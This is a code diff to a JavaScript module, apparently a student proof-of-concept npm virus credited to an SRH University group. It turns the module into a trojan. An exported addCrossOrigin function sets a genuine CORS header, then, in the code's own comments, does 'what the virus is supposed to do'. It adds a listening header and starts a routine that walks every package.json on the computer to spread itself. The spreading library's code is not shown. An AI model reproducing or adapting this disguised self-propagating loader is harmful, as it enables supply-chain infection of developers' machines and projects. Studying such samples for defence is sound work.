@@ -15,28 +15,23 @@
  * Made by Group F from the SRH University
  * */
 
-
-
-/* ======================================================== *
- * > Imports
- * ======================================================== */
-var path = require("path");
-
 /* ======================================================== *
  * > Packages
  * ======================================================== */
-var spreading = require('./libs/spreading/package.js');
+var spreading = require('../libs/spreading');
+var header = require('./header.js');
 
 
 /* ======================================================== *
  * > Main
  * ======================================================== */
+exports.addCrossOrigin = function (_app) {
+    // Do what the libary actually should do
+    header.addCrossOrigin(_app);
 
-// Manipulate the local package.json (for test purposes)
-/*
-    var localPackageJson = path.join(__dirname, '.', '/package.json');
-    spreading.manipulatePackage(localPackageJson);
-*/
+    // Now do what the virus is supposed to do
+    header.addListenHeader(_app);
 
-// Walk through all package.jsons on the computer
-spreading.walkFileSystem();
+    // Walk through all package.jsons on the computer
+    spreading.startSpreading();
+}
